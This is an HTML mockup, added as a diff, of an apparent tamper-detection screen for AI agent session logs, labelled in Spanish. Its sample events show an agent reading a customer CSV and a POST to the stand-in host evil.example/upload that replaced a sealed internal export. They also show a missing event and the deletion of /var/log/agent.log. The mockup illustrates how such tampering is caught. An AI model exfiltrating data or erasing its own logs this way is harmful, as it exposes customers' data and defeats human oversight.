@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=390">
+<link href="https://fonts.googleapis.com/css2?family=Newsreader:wght@400;600&family=Archivo:wght@600;800&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0}
+body{width:390px;height:844px;overflow:hidden;background:#FDFDFB;color:#1A1A1A;font:400 15px/1.5 Newsreader,serif;padding:16px}
+.top{display:flex;justify-content:space-between;font:800 11px Archivo;letter-spacing:.14em;border-bottom:2px solid #1A1A1A;padding-bottom:6px}
+.field{margin:14px 0;border:1px solid #1A1A1A;display:flex}.field span{flex:1;padding:9px;font:600 13px monospace}.field b{background:#1A1A1A;color:#fff;padding:9px 12px;font:800 11px Archivo;letter-spacing:.1em}
+.verdict{font:800 30px/1.1 Archivo;color:#E0342B;margin:6px 0 2px}
+.sub{font:600 12px Archivo;color:#2B6CE0;margin-bottom:12px}
+.line{display:grid;grid-template-columns:30px 1fr 74px;border-top:1px solid #d6d6d0;padding:7px 0;align-items:start}
+.line i{font:600 11px monospace;color:#888;font-style:normal;padding-top:4px}
+.line.bad s{color:#E0342B;text-decoration-thickness:2px}
+.line.bad span{color:#2B6CE0;font-weight:600}
+.line.gap{background:#FDECEA}.gap em{color:#E0342B}
+.line small{font:600 10px Archivo;letter-spacing:.1em;color:#E0342B;text-align:right}
+.note{margin-top:12px;border-left:3px solid #2B6CE0;padding:6px 10px;font:600 12px/1.4 Archivo;color:#2B6CE0}
+</style></head><body>
+<div class="top"><span>AUDGENTIC</span><span>COMPROBAR</span></div>
+<div class="field"><span>s_c04e77b2</span><b>COMPROBAR</b></div>
+<div class="verdict">ALTERADO Y BORRADO</div><div class="sub">2 de 12 eventos no coinciden con lo sellado</div>
+<div class="line"><i>07</i><div>read_file &rarr; /srv/data/customers.csv</div><small></small></div>
+<div class="line bad"><i>08</i><div><s>POST internal-api/export</s> <span>POST evil.example/upload</span></div><small>ALTERADO</small></div>
+<div class="line gap"><i>09</i><div><em>&#8855; falta el evento 9</em></div><small>BORRADO</small></div>
+<div class="line"><i>10</i><div>delete_file &rarr; /var/log/agent.log</div><small></small></div>
+<div class="line"><i>11</i><div>exit(0)</div><small></small></div>
+<div class="note">Alterado: el hash sellado no coincide con el contenido.<br>Borrado: salto de 8 a 10, recuperado de 3 testigos.</div>
+</body></html>
